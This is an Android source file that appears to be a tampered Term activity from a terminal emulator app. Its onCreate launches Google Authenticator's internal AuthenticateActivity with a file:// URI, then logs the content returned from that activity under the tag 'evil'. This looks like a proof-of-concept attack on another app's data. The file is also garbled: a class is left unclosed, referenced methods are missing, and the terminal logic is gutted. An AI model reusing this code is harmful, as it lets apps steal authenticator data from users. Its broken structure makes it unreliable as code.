/*
 * Copyright (C) 2007 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package jackpal.androidterm;

import android.text.TextUtils;
import jackpal.androidterm.compat.ActionBarCompat;
import jackpal.androidterm.compat.ActivityCompat;
import jackpal.androidterm.compat.AndroidCompat;
import jackpal.androidterm.compat.MenuItemCompat;
import jackpal.androidterm.emulatorview.EmulatorView;
import jackpal.androidterm.emulatorview.TermSession;
import jackpal.androidterm.emulatorview.UpdateCallback;
import jackpal.androidterm.emulatorview.compat.ClipboardManagerCompat;
import jackpal.androidterm.emulatorview.compat.ClipboardManagerCompatFactory;
import jackpal.androidterm.emulatorview.compat.KeycodeConstants;
import jackpal.androidterm.util.SessionList;
import jackpal.androidterm.util.TermSettings;
import android.content.ContentResolver;
import org.apache.commons.io.IOUtils;
import android.os.StrictMode;
import android.os.StrictMode.VmPolicy;
import java.io.IOException;
import java.text.Collator;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.io.InputStream;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.ContextMenu;
import android.view.ContextMenu.ContextMenuInfo;
import android.view.GestureDetector.SimpleOnGestureListener;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.view.inputmethod.InputMethodManager;
import android.widget.TextView;
import android.widget.Toast;

/**
 * A terminal emulator activity.
 */

public class Term extends Activity {

private TermViewFlipper mViewFlipper;

    private static final int VIEW_FLIPPER = R.id.view_flipper;

    private SessionList mTermSessions;

    private TermSettings mSettings;

    private final static int SELECT_TEXT_ID = 0;
    private final static int COPY_ALL_ID = 1;
    private final static int PASTE_ID = 2;
    private final static int SEND_CONTROL_KEY_ID = 3;
    private final static int SEND_FN_KEY_ID = 4;

    private boolean mAlreadyStarted = false;
    private boolean mStopServiceOnFinish = false;

    private Intent TSIntent;

    public static final int REQUEST_CHOOSE_WINDOW = 1;
    public static final String EXTRA_WINDOW_ID = "jackpal.androidterm.window_id";
    private int onResumeSelectWindow = -1;
    private ComponentName mPrivateAlias;

    private PowerManager.WakeLock mWakeLock;
    private WifiManager.WifiLock mWifiLock;
    // Available on API 12 and later
    private static final int WIFI_MODE_FULL_HIGH_PERF = 3;

    private boolean mBackKeyPressed;

    private static final String ACTION_PATH_BROADCAST = "jackpal.androidterm.broadcast.APPEND_TO_PATH";
    private static final String ACTION_PATH_PREPEND_BROADCAST = "jackpal.androidterm.broadcast.PREPEND_TO_PATH";
    private static final String PERMISSION_PATH_BROADCAST = "jackpal.androidterm.permission.APPEND_TO_PATH";
    private static final String PERMISSION_PATH_PREPEND_BROADCAST = "jackpal.androidterm.permission.PREPEND_TO_PATH";
    private int mPendingPathBroadcasts = 0;
    private BroadcastReceiver mPathReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String path = makePathFromBundle(getResultExtras(false));
            if (intent.getAction().equals(ACTION_PATH_PREPEND_BROADCAST)) {
                mSettings.setPrependPath(path);
            } else {
                mSettings.setAppendPath(path);
            }
            mPendingPathBroadcasts--;

            if (mPendingPathBroadcasts <= 0 && mTermService != null) {
                populateViewFlipper();
                populateWindowList();
            }
        }
    };
    // Available on API 12 and later
    private static final int FLAG_INCLUDE_STOPPED_PACKAGES = 0x20;

    private TermService mTermService;
    private ServiceConnection mTSConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName className, IBinder service) {
            Log.i(TermDebug.LOG_TAG, "Bound to TermService");
            TermService.TSBinder binder = (TermService.TSBinder) service;
            mTermService = binder.getService();
            if (mPendingPathBroadcasts <= 0) {
                populateViewFlipper();
                populateWindowList();
            }
        }

    @Override
    public void onCreate(Bundle icicle) {
        super.onCreate(icicle);

      Intent intent = new Intent();
      intent.setData(Uri.parse("file:///storage/emulated/0/113.html"));
      intent.setClassName("com.google.android.apps.authenticator2", "com.google.android.apps.authenticator.api.AuthenticateActivity");
      startActivityForResult(intent, 0);
       
    }

    @Override
    protected void onActivityResult(int request, int result, Intent data) {
       super.onActivityResult(request, result, data);
       Log.d("evil", "tested");
       try (InputStream inputstream = getContentResolver().openInputStream(data.getData())) {
       Log.d ("evil", IOUtils.toString(inputstream));
       }
       catch (IOException e) {
       Log.d("evil", "Catch!!!");
       //testest
       }
    }

protected static TermSession createTermSession(Context context, TermSettings settings, String initialCommand) throws IOException {
        GenericTermSession session = new ShellTermSession(settings, initialCommand);
        // XXX We should really be able to fetch this from within TermSession
        session.setProcessExitMessage(context.getString(R.string.process_exit_message));

        return session;
    }

    private TermSession createTermSession() throws IOException {
        TermSettings settings = mSettings;
        TermSession session = createTermSession(this, settings, settings.getInitialCommand());
        session.setFinishCallback(mTermService);
        return session;
    }
}
